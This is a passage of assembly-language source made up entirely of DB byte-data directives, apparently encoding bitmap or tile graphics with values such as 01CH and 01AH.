DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,005H,00BH,001H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,007H,006H
DB 008H,005H,005H,005H,005H,007H,008H,01BH,003H,000H,000H,000H,000H,013H,013H
DB 012H,012H,012H,013H,012H,012H,012H,005H,005H,013H,012H,013H,012H,013H,013H
DB 00EH,005H,005H,00CH,016H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,019H,00CH,018H,01AH,01AH,014H,00DH,010H,010H,010H,00EH,00EH,00EH
DB 00EH,008H,008H,005H,005H,002H,000H,003H,01BH,003H,01CH,01CH,004H,006H,007H
DB 008H,005H,005H,008H,007H,006H,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,008H,006H,006H,006H
DB 006H,006H,008H,01BH,003H,000H,000H,000H,000H,000H,012H,013H,013H,013H,012H
DB 012H,012H,012H,010H,004H,010H,012H,013H,013H,012H,013H,012H,008H,004H,000H
DB 005H,014H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H
DB 016H,01AH,019H,013H,00CH,00FH,013H,010H,00EH,00EH,008H,00EH,00EH,008H,008H
DB 005H,005H,008H,000H,000H,003H,01BH,003H,01CH,01CH,001H,007H,006H,006H,006H
DB 006H,006H,00BH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,00BH,004H,00BH,004H,00BH,01BH
DB 003H,01BH,000H,000H,000H,002H,012H,013H,013H,013H,013H,012H,010H,010H,010H
DB 005H,010H,012H,012H,013H,012H,012H,013H,010H,005H,002H,000H,002H,00EH,019H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,018H,012H,014H,01AH,017H,012H
DB 00EH,00DH,00EH,014H,010H,010H,00EH,00EH,008H,008H,008H,008H,005H,005H,000H
DB 000H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,00BH,005H,00BH,001H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H
DB 000H,002H,012H,012H,013H,013H,013H,012H,012H,010H,010H,008H,00EH,013H,010H
DB 012H,013H,012H,010H,012H,008H,005H,000H,000H,000H,00CH,010H,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,019H,017H,013H,00CH,00CH,015H,013H,00CH,00DH,00DH,013H,00EH
DB 010H,013H,010H,00EH,00EH,00EH,008H,008H,005H,005H,005H,000H,000H,000H,000H
DB 01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,000H,002H,012H,012H
DB 013H,014H,013H,012H,012H,010H,010H,010H,008H,013H,012H,010H,010H,012H,010H
DB 00EH,00EH,005H,005H,000H,000H,000H,002H,00CH,00EH,016H,016H,016H,015H,017H
DB 019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,019H,018H,015H,016H,013H
DB 00EH,00CH,00CH,00DH,00DH,00EH,00EH,00FH,013H,012H,013H,013H,005H,013H,013H
DB 010H,00EH,00EH,008H,008H,008H,005H,005H,008H,002H,000H,000H,003H,01BH,003H
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,003H,01BH,000H,000H,012H,013H,013H,014H,013H,012H
DB 010H,010H,012H,013H,010H,010H,012H,00EH,00CH,00CH,00CH,00CH,00CH,00CH,00CH
DB 00CH,00CH,005H,004H,002H,005H,00CH,00CH,00CH,00CH,00CH,00CH,00CH,00CH,00CH
DB 00CH,00CH,00CH,00CH,00CH,00CH,00CH,00CH,00CH,00CH,00CH,00EH,00EH,010H,00EH
DB 010H,00EH,00DH,00DH,00FH,013H,012H,00FH,013H,00EH,005H,013H,012H,010H,00EH
DB 00EH,008H,008H,008H,005H,005H,005H,002H,000H,000H,003H,01BH,003H,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,003H,01BH,000H,000H,013H,013H,013H,013H,013H,012H,012H,012H,012H,013H
DB 012H,005H,012H,010H,00CH,010H,016H,013H,012H,012H,012H,010H,00EH,00EH,00EH
DB 00EH,010H,00EH,00EH,00EH,00EH,00CH,00EH,00CH,010H,012H,013H,014H,016H,014H
DB 013H,012H,010H,00CH,00EH,013H,012H,00EH,00CH,002H,000H,00CH,00EH,00EH,00EH
DB 00EH,00CH,00CH,00CH,00CH,00CH,00DH,00EH,00CH,00CH,00EH,00DH,00EH,008H,008H
DB 008H,005H,005H,005H,005H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H
DB 000H,000H,012H,013H,012H,012H,013H,013H,013H,012H,012H,012H,005H,010H,012H
DB 00CH,00CH,019H,01AH,01AH,01AH,01AH,01AH,01AH,019H,019H,017H,00CH,019H,019H
DB 016H,00CH,00CH,00CH,00CH,015H,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H
DB 018H,00CH,016H,01AH,019H,014H,005H,002H,00CH,017H,019H,019H,019H,018H,017H
DB 017H,017H,015H,00DH,013H,017H,017H,014H,00DH,00EH,008H,008H,008H,008H,005H
DB 005H,005H,005H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,000H,000H,000H,004H
DB 012H,012H,012H,013H,013H,012H,012H,012H,008H,010H,013H,00EH,00CH,016H,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H,012H,01AH,01AH,014H,00CH,00EH
DB 00CH,016H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,018H,00CH
DB 017H,01AH,01AH,013H,00CH,00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 017H,010H,01AH,01AH,01AH,012H,00DH,00EH,008H,005H,005H,005H,005H,005H,005H
DB 004H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,000H,000H,002H,00FH,013H,013H,012H
DB 013H,012H,012H,012H,010H,008H,013H,012H,00EH,00CH,019H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,010H,016H,01AH,01AH,010H,00CH,00CH,016H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H,00CH,019H,01AH
DB 019H,00EH,00CH,017H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,010H,016H
DB 01AH,01AH,017H,00CH,00EH,008H,005H,005H,005H,005H,005H,005H,004H,000H,000H
DB 003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01BH,003H,000H,000H,00FH,00FH,013H,013H,012H,012H,012H,012H
DB 010H,008H,012H,013H,012H,00CH,016H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,019H,00CH,018H,01AH,018H,00CH,00CH,013H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,014H,00EH,01AH,01AH,018H,00CH
DB 016H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,017H,00CH,019H,01AH,01AH
DB 012H,00EH,008H,008H,005H,005H,005H,005H,005H,000H,000H,000H,01BH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 003H,01BH,000H,005H,013H,013H,013H,013H,012H,012H,010H,012H,008H,010H,013H
DB 013H,010H,00CH,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H,00EH
DB 01AH,01AH,016H,005H,012H,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,016H,017H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,010H,013H,01AH,01AH,015H,00EH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,012H,016H,01AH,01AH,017H,00CH,00EH
DB 008H,005H,005H,005H,005H,005H,002H,000H,000H,003H,01BH,003H,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,000H,000H
DB 013H,014H,013H,00FH,012H,012H,012H,013H,012H,008H,013H,013H,012H,00CH,016H
DB 01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH,013H,014H,01AH,01AH,00EH
DB 010H,019H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,019H,00CH,00CH,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,019H,00CH,016H,01AH,019H,00CH,018H,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,017H,00CH,019H,01AH,01AH,00FH,00EH,008H,008H,005H
DB 005H,005H,005H,005H,002H,000H,000H,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 000H,000H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H
DB 01CH,003H,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01BH,003H,000H,005H,014H,013H,00FH
DB 012H,012H,00FH,013H,012H,008H,00EH,013H,00FH,010H,00CH,018H,01AH,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,019H,00CH,017H,01AH,016H,00CH,019H,01AH,01AH
DB 01AH,01AH,01AH,01AH,01AH,01AH,017H,00CH,00EH,016H,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,018H,00CH,017H,01AH,013H,014H,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,012H,016H,01AH,01AH,017H,00CH,008H,005H,005H,005H,005H,005H
DB 005H,005H,000H,000H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01CH,003H,01CH,003H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,000H,000H,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,003H,01CH,003H,01BH,003H,01BH,003H
DB 01BH,003H,01BH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,003H,01CH,003H,01CH,003H,01CH,01CH,01CH,01CH,01CH,01CH,01CH,01CH
DB 01CH,01CH,01CH,003H,01BH,003H,000H,000H,013H,013H,012H,012H,010H,00FH,013H
DB 00FH,00EH,008H,012H,012H,012H,00CH,00EH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,017H,00CH,01AH,019H,00CH,018H,01AH,01AH,01AH,01AH,01AH,01AH
DB 01AH,01AH,01AH,00EH,016H,018H,012H,01AH,01AH,01AH,01AH,01AH,01AH,01AH,01AH
